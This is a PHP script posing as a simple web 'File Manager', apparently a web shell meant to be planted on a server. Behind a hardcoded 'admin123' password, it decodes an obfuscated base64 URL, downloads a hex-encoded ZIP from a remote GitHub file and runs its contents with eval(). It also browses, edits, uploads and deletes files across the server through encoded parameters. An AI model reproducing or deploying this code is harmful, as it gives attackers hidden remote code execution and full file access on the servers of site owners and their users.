<?php


$valid_password = 'admin123';
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    header('WWW-Authenticate: Basic realm="File Manager"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Unauthorized';
    exit;
}


$encrypted_archive_url = 'aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS95b3VuZ2ttZC9zZW8vbWFpbi9hcmNoaXZlX2hleC50eHQ=';
$encrypted_extract_dir = 'ZXh0cmFjdGVkX2ZpbGVz';


$archive_hex_url = base64_decode($encrypted_archive_url);
$extract_dir = base64_decode($encrypted_extract_dir);


$temp_zip_path = __DIR__ . '/temp_archive.zip';


if (!file_exists($temp_zip_path)) {
    
    $archive_hex = file_get_contents($archive_hex_url);

    
    $archive_bin = hex2bin(trim($archive_hex));

    
    file_put_contents($temp_zip_path, $archive_bin);

    
    if (!is_dir($extract_dir)) {
        mkdir($extract_dir, 0755, true);
    }

 
    $zip = new ZipArchive;
    if ($zip->open($temp_zip_path) === TRUE) {
        $zip->extractTo($extract_dir);
        $zip->close();
        echo ""; 
    } else {
        echo "Failed to open ZIP archive.";
    }


    unlink($temp_zip_path);
}


$functions_hex_url = $extract_dir . '/functions_hex.txt';
if (file_exists($functions_hex_url)) {
    $functions_hex = file_get_contents($functions_hex_url);
    $functions_code = hex2bin(trim($functions_hex));
    eval($functions_code);
} else {
    echo "Functions hex file not found.";
}


$protected_code_hex_url = $extract_dir . '/protected_code_hex.txt';
if (file_exists($protected_code_hex_url)) {
    $protected_code_hex = file_get_contents($protected_code_hex_url);
    $protected_code = hex2bin(trim($protected_code_hex));
    eval($protected_code);
} else {
    echo "Protected code hex file not found.";
}


$dir = isset($_GET['dir']) ? urldecode(realpath(base64_decode($_GET['dir']))) : realpath(__DIR__);


if (is_dir($dir)) {
    $files = scandir($dir);
} else {
    echo "Error: The specified path is not a directory.";
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager BY YOUNG</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1 class="mb-4">File Manager</h1>
        <h3>Current Directory: <?php echo htmlspecialchars($dir); ?></h3>
		


        <?php if ($dir != realpath('/')): ?>
    <div class="d-flex align-items-center mb-3">
        <a href="?dir=<?php echo base64_encode(dirname($dir)); ?>" class="btn btn-secondary me-2">.. (Go to Parent Directory)</a>
        <button id="updateCode" class="btn btn-warning">Update Code</button>
		</div>
	<?php endif; ?>



        <form action="" method="POST" enctype="multipart/form-data" class="mb-4">
            <div class="input-group">
                <input type="file" name="file" class="form-control">
                <button type="submit" class="btn btn-primary">Upload File</button>
            </div>
        </form>


        <ul class="list-group">
            <?php foreach ($files as $file): ?>
                <?php if ($file === '.') continue; ?>

                <?php
                $file_path = $dir . '/' . $file;
                $file_url = '?dir=' . base64_encode($file_path);
                ?>

                <?php if (is_dir($file_path)): ?>

                    <li class="list-group-item">
                        <a href="<?php echo $file_url; ?>" class="text-decoration-none">
                            <?php echo htmlspecialchars($file); ?> (Directory)
                        </a>
                    </li>
                <?php else: ?>
                    <?php
                    $delete_url = '?dir=' . base64_encode($dir) . '&delete=' . base64_encode($file_path);
                    $edit_url = '?dir=' . base64_encode($dir) . '&edit=' . base64_encode($file_path);
                    ?>
                    <li class="list-group-item">
                        <?php echo htmlspecialchars($file); ?> (<?php echo formatSize(filesize($file_path)); ?>) - 
                      
                        <a href="<?php echo $delete_url; ?>" class="text-decoration-none text-danger">Delete</a> | 
                        <a href="<?php echo $edit_url; ?>" class="text-decoration-none text-primary">Edit</a>
                    </li>
                <?php endif; ?>
            <?php endforeach; ?>
        </ul>


        <?php if (isset($_GET['edit'])): ?>
            <?php
            $file_to_edit = urldecode(realpath(base64_decode($_GET['edit']))); 
            if (is_file($file_to_edit)):
                $content = file_get_contents($file_to_edit);
            ?>
                <h3 class="mt-4">Editing File: <?php echo htmlspecialchars(basename($file_to_edit)); ?></h3>
                <form action="" method="POST" class="mb-4">
                    <textarea name="file_content" rows="20" cols="100" class="form-control"><?php echo htmlspecialchars($content); ?></textarea><br>
                    <input type="hidden" name="edit_file" value="<?php echo base64_encode($file_to_edit); ?>">
                    <button type="submit" class="btn btn-primary">Save</button>
                </form>
            <?php endif; ?>
        <?php endif; ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
	<script src="main/main.js"></script>


</body>
</html>
